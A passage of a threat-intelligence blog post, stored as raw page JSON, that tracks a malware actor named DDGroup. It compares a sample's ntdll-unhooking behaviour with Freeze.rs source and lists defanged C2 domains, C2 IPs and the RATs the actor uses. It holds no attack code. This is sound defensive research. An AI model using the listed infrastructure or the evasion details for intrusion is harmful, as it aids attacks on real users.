https:\u002F\u002Fgithub.com\u002Foptiv\u002FFreeze.rs\u002Fblob\u002F52f0bc0f301182c9d18afd89bfda1d69e2cef31b\u002Flib\u002Fsrc\u002Flib.rs#L142C1-L142C1.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":65,"end":174,"href":"https:\u002F\u002Fgithub.com\u002Foptiv\u002FFreeze.rs\u002Fblob\u002F52f0bc0f301182c9d18afd89bfda1d69e2cef31b\u002Flib\u002Fsrc\u002Flib.rs#L142C1-L142C1","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_77":{"__typename":"Paragraph","id":"1d3124020da0_77","name":"1cc9","type":"P","href":null,"layout":null,"metadata":null,"text":"Note that the proper way to hide the console Window for Rust applications is by using the #![windows_subsystem = “windows”] attribute in your program — I am not sure why they did it this way, as these function calls are pretty distinctive for detection.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_78":{"__typename":"Paragraph","id":"1d3124020da0_78","name":"14c0","type":"P","href":null,"layout":null,"metadata":null,"text":"4. At 0x1800014a3, they call a function (at 0x1800036b0 ) which maps in C:\\Windows\\System32\\ntdll.dll via calling CreateFileMappingW, MapViewOfFile. They parse the PE headers and specifically look for the address of the .text section; they look for both the string .text and the string REASON in there. This matches the code in these places exactly: https:\u002F\u002Fgithub.com\u002Foptiv\u002FFreeze.rs\u002Fblob\u002F52f0bc0f301182c9d18afd89bfda1d69e2cef31b\u002Flib\u002Fsrc\u002Flib.rs#L171, https:\u002F\u002Fgithub.com\u002Foptiv\u002FFreeze.rs\u002Fblob\u002F52f0bc0f301182c9d18afd89bfda1d69e2cef31b\u002Flib\u002Fsrc\u002Flib.rs#L208","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":350,"end":450,"href":"https:\u002F\u002Fgithub.com\u002Foptiv\u002FFreeze.rs\u002Fblob\u002F52f0bc0f301182c9d18afd89bfda1d69e2cef31b\u002Flib\u002Fsrc\u002Flib.rs#L171","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":452,"end":552,"href":"https:\u002F\u002Fgithub.com\u002Foptiv\u002FFreeze.rs\u002Fblob\u002F52f0bc0f301182c9d18afd89bfda1d69e2cef31b\u002Flib\u002Fsrc\u002Flib.rs#L208","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_79":{"__typename":"Paragraph","id":"1d3124020da0_79","name":"6abd","type":"P","href":null,"layout":null,"metadata":null,"text":"5. A weird cryptographic mistake was observed, in which a Base64 encoded “IV” value is defined for the RC4 algorithm. RC4 does not make use of an IV. This matches: https:\u002F\u002Fgithub.com\u002Foptiv\u002FFreeze.rs\u002Fblob\u002F52f0bc0f301182c9d18afd89bfda1d69e2cef31b\u002Flib\u002Fsrc\u002Flib.rs#L375","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":164,"end":264,"href":"https:\u002F\u002Fgithub.com\u002Foptiv\u002FFreeze.rs\u002Fblob\u002F52f0bc0f301182c9d18afd89bfda1d69e2cef31b\u002Flib\u002Fsrc\u002Flib.rs#L375","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_80":{"__typename":"Paragraph","id":"1d3124020da0_80","name":"da02","type":"P","href":null,"layout":null,"metadata":null,"text":"In regards to the observed unidentified pdb path, cxiao actually pointed out a solution I had not thought about before:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_81":{"__typename":"Paragraph","id":"1d3124020da0_81","name":"4acd","type":"BQ","href":null,"layout":null,"metadata":null,"text":"For the PDB path we see (C:\\\\Users\\\\Administrator\\\\Desktop\\\\crock\\\\target\\\\release\\\\deps\\\\crock.pdb) — when generating payloads with Freeze.rs, the user is able to specify what the output name they want is (e.g. crock.exe, crock.dll). Freeze.rs then creates a generated folder with the first part of that name (e.g. crock), writes the generated Rust build files and source files into that folder, then does a build of a new Rust binary from that folder: https:\u002F\u002Fgithub.com\u002Foptiv\u002FFreeze.rs\u002Fblob\u002F52f0bc0f301182c9d18afd89bfda1d69e2cef31b\u002Fsrc\u002Fmain.rs#L133\nThis will result in, by default, a PDB path which has the name of the generated project (crock.pdb)","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":454,"end":551,"href":"https:\u002F\u002Fgithub.com\u002Foptiv\u002FFreeze.rs\u002Fblob\u002F52f0bc0f301182c9d18afd89bfda1d69e2cef31b\u002Fsrc\u002Fmain.rs#L133","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_82":{"__typename":"Paragraph","id":"1d3124020da0_82","name":"f3a3","type":"P","href":null,"layout":null,"metadata":null,"text":"So once again we observed our actor making use of open-source tooling to prepare their attacks.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_83":{"__typename":"Paragraph","id":"1d3124020da0_83","name":"9f8c","type":"H4","href":null,"layout":null,"metadata":null,"text":"Chapter 5: The same actor — over and over again","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":47,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_84":{"__typename":"Paragraph","id":"1d3124020da0_84","name":"8fd1","type":"P","href":null,"layout":null,"metadata":null,"text":"Now, let us get to the part where things get really interesting which is also why I decided to give the actor a name and dedicate this whole blog post to their activities.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_85":{"__typename":"Paragraph","id":"1d3124020da0_85","name":"8eeb","type":"P","href":null,"layout":null,"metadata":null,"text":"When I normally see an actor making use of dynamic DNS services for C2 connections, paired with open-source tooling, I am mostly convinced to be looking at a non-sophisticated actor. And on this occasion, it seems that this is how a rather big fish was able to evade public attention for a long time.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_86":{"__typename":"Paragraph","id":"1d3124020da0_86","name":"c2f8","type":"P","href":null,"layout":null,"metadata":null,"text":"Let us have a look at the previously discovered C2 servers:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_87":{"__typename":"Paragraph","id":"1d3124020da0_87","name":"d20a","type":"ULI","href":null,"layout":null,"metadata":null,"text":"secoundxwormm.ddns[.]net","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_88":{"__typename":"Paragraph","id":"1d3124020da0_88","name":"adac","type":"ULI","href":null,"layout":null,"metadata":null,"text":"freshinxworm.ddns[.]net","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_89":{"__typename":"Paragraph","id":"1d3124020da0_89","name":"9bec","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Darwin090.gleeze[.]com","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_90":{"__typename":"Paragraph","id":"1d3124020da0_90","name":"9b03","type":"ULI","href":null,"layout":null,"metadata":null,"text":"randall010.camdvr[.]org","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_91":{"__typename":"Paragraph","id":"1d3124020da0_91","name":"ecd9","type":"P","href":null,"layout":null,"metadata":null,"text":"As we all know, domains usually point at IP addresses using the DNS protocol. And this is not different with dynamic DNS domains. Luckily, I have access to a great tool for DNS history data called Axon Intel by Validin LLC (*). Together with other known search tools like OTX Alienvault and VirusTotal, it is not difficult to get a history of IP addresses associated with the above C2 domains.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":197,"end":207,"href":"https:\u002F\u002Faxonintel.validin.com\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":272,"end":286,"href":"https:\u002F\u002Fotx.alienvault.com\u002Fbrowse\u002Fglobal\u002Fpulses?include_inactive=0&sort=-modified&page=1&limit=10","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_92":{"__typename":"Paragraph","id":"1d3124020da0_92","name":"b08e","type":"P","href":null,"layout":null,"metadata":null,"text":"Let us start with secoundxwormm.ddns[.]net. Using AxonIntel we can quickly determine that the domain previously pointed at IP: 154.53.51.233","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":127,"end":140,"href":"https:\u002F\u002Faxonintel.validin.com\u002Faxon?find=154.53.51.233&type=ip4","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_93":{"__typename":"Paragraph","id":"1d3124020da0_93","name":"8f3f","type":"P","href":null,"layout":null,"metadata":null,"text":"Here is a screenshot of the history of that IP:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*-CjX3JQHm7oLQoUTwB4g_A.png":{"__typename":"ImageMetadata","id":"1*-CjX3JQHm7oLQoUTwB4g_A.png","originalHeight":1523,"originalWidth":2173,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:1d3124020da0_94":{"__typename":"Paragraph","id":"1d3124020da0_94","name":"bdc8","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*-CjX3JQHm7oLQoUTwB4g_A.png"},"text":"Figure 9: AxonIntel DNS history for 154.53.51.233","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_95":{"__typename":"Paragraph","id":"1d3124020da0_95","name":"8c99","type":"P","href":null,"layout":null,"metadata":null,"text":"Noticed something? There is two other dynamic DNS domain that pointed at this IP for the same timeframe, one of them we have seen before: freshinxworm.ddns[.]net and one is new: quasharr.ddns[.]net","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_96":{"__typename":"Paragraph","id":"1d3124020da0_96","name":"a643","type":"P","href":null,"layout":null,"metadata":null,"text":"Let's have a look at quasharr.ddns[.]net it in VirusTotal:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*L_8s891ykJytHKCSeccfuw.png":{"__typename":"ImageMetadata","id":"1*L_8s891ykJytHKCSeccfuw.png","originalHeight":460,"originalWidth":1090,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:1d3124020da0_97":{"__typename":"Paragraph","id":"1d3124020da0_97","name":"74be","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*L_8s891ykJytHKCSeccfuw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_98":{"__typename":"Paragraph","id":"1d3124020da0_98","name":"a482","type":"P","href":null,"layout":null,"metadata":null,"text":"As you can see, there is some evil associated. “invoice.bat” even fits the Invoice-themed lures observed for the other C2s. Interesting, was that a lucky hit? Let's try with freshinxworm.ddns[.]net.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*l41QdY918meFMiCt1fLatA.png":{"__typename":"ImageMetadata","id":"1*l41QdY918meFMiCt1fLatA.png","originalHeight":897,"originalWidth":2261,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:1d3124020da0_99":{"__typename":"Paragraph","id":"1d3124020da0_99","name":"e79c","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*l41QdY918meFMiCt1fLatA.png"},"text":"Figure 10: AxonIntel DNS history for freshinxworm.ddns[.]net","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_100":{"__typename":"Paragraph","id":"1d3124020da0_100","name":"11c1","type":"P","href":null,"layout":null,"metadata":null,"text":"As you can see, the domain has been pointing to 3 different IPs in the timeframe of one month. It is likely the same actor. Let's have a look at the IPs:\n89.117.72.232 and 154.12.233.76","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":153,"end":167,"href":"https:\u002F\u002Faxonintel.validin.com\u002Faxon?find=89.117.72.232&type=ip4","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":172,"end":185,"href":"https:\u002F\u002Faxonintel.validin.com\u002Faxon?find=154.12.233.76&type=ip4","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*fZQNKSugzAPMHwngXkxjWA.png":{"__typename":"ImageMetadata","id":"1*fZQNKSugzAPMHwngXkxjWA.png","originalHeight":1097,"originalWidth":2283,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:1d3124020da0_101":{"__typename":"Paragraph","id":"1d3124020da0_101","name":"7f5a","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*fZQNKSugzAPMHwngXkxjWA.png"},"text":"Figure 11: AxonIntel DNS history for 89.117.72.232","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*w1eh5pwEx5rtIenpqKPuqA.png":{"__typename":"ImageMetadata","id":"1*w1eh5pwEx5rtIenpqKPuqA.png","originalHeight":812,"originalWidth":2252,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:1d3124020da0_102":{"__typename":"Paragraph","id":"1d3124020da0_102","name":"de8b","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*w1eh5pwEx5rtIenpqKPuqA.png"},"text":"Figure 12: AxonIntel DNS history for 154.12.233.76","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_103":{"__typename":"Paragraph","id":"1d3124020da0_103","name":"2771","type":"P","href":null,"layout":null,"metadata":null,"text":"Well, at this point I think we can all agree that quasharr.ddns[.]net is also linked to DDGroup. \nLet us have a look at this newfound domain in AxonIntel:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*oW515hg0ztbTSoH_00n1xA.png":{"__typename":"ImageMetadata","id":"1*oW515hg0ztbTSoH_00n1xA.png","originalHeight":1424,"originalWidth":2199,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:1d3124020da0_104":{"__typename":"Paragraph","id":"1d3124020da0_104","name":"722b","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*oW515hg0ztbTSoH_00n1xA.png"},"text":"Figure 13: AxonIntel DNS history for quasharr.ddns[.]net","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_105":{"__typename":"Paragraph","id":"1d3124020da0_105","name":"313b","type":"P","href":null,"layout":null,"metadata":null,"text":"As you can see, this domain was very busy. Let's have a look at one of the more interesting IPs:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*XjlLxhV_Doypvm84MigwBw.png":{"__typename":"ImageMetadata","id":"1*XjlLxhV_Doypvm84MigwBw.png","originalHeight":1098,"originalWidth":2235,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:1d3124020da0_106":{"__typename":"Paragraph","id":"1d3124020da0_106","name":"00ad","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*XjlLxhV_Doypvm84MigwBw.png"},"text":"Figure 14: AxonIntel DNS history for 154.12.234.207","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_107":{"__typename":"Paragraph","id":"1d3124020da0_107","name":"baac","type":"P","href":null,"layout":null,"metadata":null,"text":"As you can see, there are 5 additional dynamic DNS domains here. And if we look at them in VirusTotal, we would see that all of them have been associated with off-the-shelf malware like QuasarRAT, BitRat, and similar.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_108":{"__typename":"Paragraph","id":"1d3124020da0_108","name":"5a01","type":"P","href":null,"layout":null,"metadata":null,"text":"I don’t want to bore you with the details but this search can be continued. To be totally honest with you, I have probably already lost half my hair because whenever I thought I would finally have arrived at the beginning of this actor's career, I found another IP that has several new DynDNS Domains associated, all following the same scheme.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_109":{"__typename":"Paragraph","id":"1d3124020da0_109","name":"22ea","type":"P","href":null,"layout":null,"metadata":null,"text":"So far I have been able to associate over 110 dynamic DNS spanning over 94 IP Addresses with this actor. I am able to track this actor's activity to late 2019 and the only reason I did not track further was because of the sheer overwhelming amount of domains and IPs in my lists. Manual tracking can only bring you this far if you want to keep your sanity ^^","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":36,"end":103,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_110":{"__typename":"Paragraph","id":"1d3124020da0_110","name":"59c6","type":"H4","href":null,"layout":null,"metadata":null,"text":"Chapter 6: I am not the only one","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":32,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_111":{"__typename":"Paragraph","id":"1d3124020da0_111","name":"559c","type":"P","href":null,"layout":null,"metadata":null,"text":"What is very interesting to me is that this actor has played a role model for new attack vectors on more than one occasion. Not only is DDGroup one of the first actors to use the new WebDAV \u002F “search-ms” technique. They also were one of the first actors to make use of the OneNote malware delivery technique back in January 2023:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_112":{"__typename":"Paragraph","id":"1d3124020da0_112","name":"4ae2","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Internet Storm Center\nInternet Storm Center Diary 2023-09-06, Author: Johannes Ullrichisc.sans.edu","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":98,"href":"https:\u002F\u002Fisc.sans.edu\u002Fdiary\u002FA+First+Malicious+OneNote+Document\u002F29470","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":21,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":22,"end":86,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fisc.sans.edu\u002Fdiary\u002FA+First+Malicious+OneNote+Document\u002F29470","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*ggCEsWLF-G-TAz4P"}},"Paragraph:1d3124020da0_113":{"__typename":"Paragraph","id":"1d3124020da0_113","name":"ccbd","type":"P","href":null,"layout":null,"metadata":null,"text":"(C2: wormxwar.ddns[.]net )","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_114":{"__typename":"Paragraph","id":"1d3124020da0_114","name":"e348","type":"P","href":null,"layout":null,"metadata":null,"text":"which was also observed by my friend and colleague 0xToxin:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"MediaResource:154c6f7a11a6794bd00fff1521c6ebdf":{"__typename":"MediaResource","id":"154c6f7a11a6794bd00fff1521c6ebdf","iframeSrc":"https:\u002F\u002Fcdn.embedly.com\u002Fwidgets\u002Fmedia.html?type=text%2Fhtml&key=a19fcc184b9711e1b4764040d3dc5c07&schema=twitter&url=https%3A\u002F\u002Ftwitter.com\u002F0xToxin\u002Fstatus\u002F1624368467511021569&image=https%3A\u002F\u002Fi.embed.ly\u002F1\u002Fimage%3Furl%3Dhttps%253A%252F%252Fabs.twimg.com%252Ferrors%252Flogo46x38.png%26key%3Da19fcc184b9711e1b4764040d3dc5c07","iframeHeight":281,"iframeWidth":500,"title":"0xToxin🕷️ on Twitter: \"🔥#ASyncRAT delivered via OneNote document.OneNote contains embedded .bat script.⚠️IOC's:207.244.236[.205:6606,7707,8808Bazaar:https:\u002F\u002Ft.co\u002F76Aoa5keuh🧵 [1\u002F6] pic.twitter.com\u002FMTNizwzWe7 \u002F Twitter\""},"Paragraph:1d3124020da0_115":{"__typename":"Paragraph","id":"1d3124020da0_115","name":"d489","type":"IFRAME","href":null,"layout":"INSET_CENTER","metadata":null,"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":{"__typename":"Iframe","mediaResource":{"__ref":"MediaResource:154c6f7a11a6794bd00fff1521c6ebdf"}},"mixtapeMetadata":null},"Paragraph:1d3124020da0_116":{"__typename":"Paragraph","id":"1d3124020da0_116","name":"aaa4","type":"P","href":null,"layout":null,"metadata":null,"text":"(IP has DNS History links to: quasharr.ddns[.]net, newtryex.ddns[.]net, wormxwar.ddns[.]net, retsuportm.ddnsfree[.]com, mywormtwon.ddns[.]net, spreadrem1.ddnsfree[.]com)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_117":{"__typename":"Paragraph","id":"1d3124020da0_117","name":"3c34","type":"P","href":null,"layout":null,"metadata":null,"text":"The same IP was mentioned in a Trellix article in regards to OneNote spreading as well:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_118":{"__typename":"Paragraph","id":"1d3124020da0_118","name":"afae","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Qakbot evolves to OneNote Malware Distribution\nSince the end of January 2023, there has been an upsurge in the number of Qakbot campaigns using a novel delivery…www.trellix.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":176,"href":"https:\u002F\u002Fwww.trellix.com\u002Fen-us\u002Fabout\u002Fnewsroom\u002Fstories\u002Fresearch\u002Fqakbot-evolves-to-onenote-malware-distribution.html","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":46,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":47,"end":161,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fwww.trellix.com\u002Fen-us\u002Fabout\u002Fnewsroom\u002Fstories\u002Fresearch\u002Fqakbot-evolves-to-onenote-malware-distribution.html","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*0S3ILLNj6lIKjsXF"}},"Paragraph:1d3124020da0_119":{"__typename":"Paragraph","id":"1d3124020da0_119","name":"f7c2","type":"P","href":null,"layout":null,"metadata":null,"text":"They also made it into a recent article by Fortinet describing the new WebDAV attack vector using infrastructure that replaced the one I described at the beginning of this blog post:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_120":{"__typename":"Paragraph","id":"1d3124020da0_120","name":"e221","type":"P","href":null,"layout":null,"metadata":null,"text":"https:\u002F\u002Fwww.fortinet.com\u002Fblog\u002Fthreat-research\u002Fmalware-distributed-via-freezers-and-syk-crypter","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":94,"href":"https:\u002F\u002Fwww.fortinet.com\u002Fblog\u002Fthreat-research\u002Fmalware-distributed-via-freezers-and-syk-crypter","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_121":{"__typename":"Paragraph","id":"1d3124020da0_121","name":"1a61","type":"P","href":null,"layout":null,"metadata":null,"text":"Associated C2s: freshinxworm[.]ddns[.]net, churchxx[.]ddns[.]net, plunder[.]ddnsguru[.]com, plunder[.]dedyn[.]io, plunder[.]jumpingcrab[.]com, plunder[.]dynnamn[.]ru )","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_122":{"__typename":"Paragraph","id":"1d3124020da0_122","name":"e6c9","type":"P","href":null,"layout":null,"metadata":null,"text":"In the article, Fortinet also points out the use of “Freeze.rs”.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_123":{"__typename":"Paragraph","id":"1d3124020da0_123","name":"1b68","type":"P","href":null,"layout":null,"metadata":null,"text":"With all these mentions in public reports, I can only assume why no one ever cared to have a closer look at this actor.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_124":{"__typename":"Paragraph","id":"1d3124020da0_124","name":"38be","type":"H4","href":null,"layout":null,"metadata":null,"text":"Chapter 7: Other Observations and Outlook","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_125":{"__typename":"Paragraph","id":"1d3124020da0_125","name":"aaac","type":"P","href":null,"layout":null,"metadata":null,"text":"As you have seen, DDGroup is a very active actor whose activity spans over the years. The observed arsenal includes many open-source tools and commercial RATs.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_126":{"__typename":"Paragraph","id":"1d3124020da0_126","name":"81ac","type":"P","href":null,"layout":null,"metadata":null,"text":"To give an overview, here is a list of all observed tools and malware types the actor has been using in recent years:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_127":{"__typename":"Paragraph","id":"1d3124020da0_127","name":"9133","type":"OLI","href":null,"layout":null,"metadata":null,"text":"Remcos RAT","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_128":{"__typename":"Paragraph","id":"1d3124020da0_128","name":"3494","type":"OLI","href":null,"layout":null,"metadata":null,"text":"ModiLoader \u002F DBatLoader","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_129":{"__typename":"Paragraph","id":"1d3124020da0_129","name":"869f","type":"OLI","href":null,"layout":null,"metadata":null,"text":"Quasar RAT","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_130":{"__typename":"Paragraph","id":"1d3124020da0_130","name":"4a15","type":"OLI","href":null,"layout":null,"metadata":null,"text":"AsyncRAT","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_131":{"__typename":"Paragraph","id":"1d3124020da0_131","name":"7637","type":"OLI","href":null,"layout":null,"metadata":null,"text":"BitRat","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_132":{"__typename":"Paragraph","id":"1d3124020da0_132","name":"9744","type":"OLI","href":null,"layout":null,"metadata":null,"text":"Warzone RAT \u002F AveMaria RAT","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_133":{"__typename":"Paragraph","id":"1d3124020da0_133","name":"a078","type":"OLI","href":null,"layout":null,"metadata":null,"text":"NetWire 